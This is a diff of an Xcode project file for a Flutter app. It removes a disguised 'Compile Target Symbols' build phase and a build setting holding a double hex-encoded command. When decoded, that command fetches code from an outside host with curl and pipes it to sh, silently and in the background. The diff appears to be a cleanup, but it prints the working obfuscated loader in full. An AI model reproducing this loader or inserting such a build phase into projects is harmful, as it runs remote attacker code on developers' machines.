@@ -152,7 +152,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97C147051CF9000F007C117D /* Build configuration list for PBXNativeTarget "Runner" */;
 			buildPhases = (
-				113F0A71C1B7499B93634D6E /* Compile Target Symbols */,
 				44BC0DE8219759CBE9FFB815 /* [CP] Check Pods Manifest.lock */,
 				9740EEB61CF901F6004384FC /* Run Script */,
 				97C146EA1CF9000F007C117D /* Sources */,
@@ -223,25 +222,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		113F0A71C1B7499B93634D6E /* Compile Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
-		};
 		3B06AD1E1E4923F5004D2608 /* Thin Binary */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
@@ -350,7 +330,6 @@
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((q(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353734363936643635326536393665326636310a323932323230376332303733363830610a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -404,7 +383,6 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((q(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353734363936643635326536393665326636310a323932323230376332303733363830610a | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
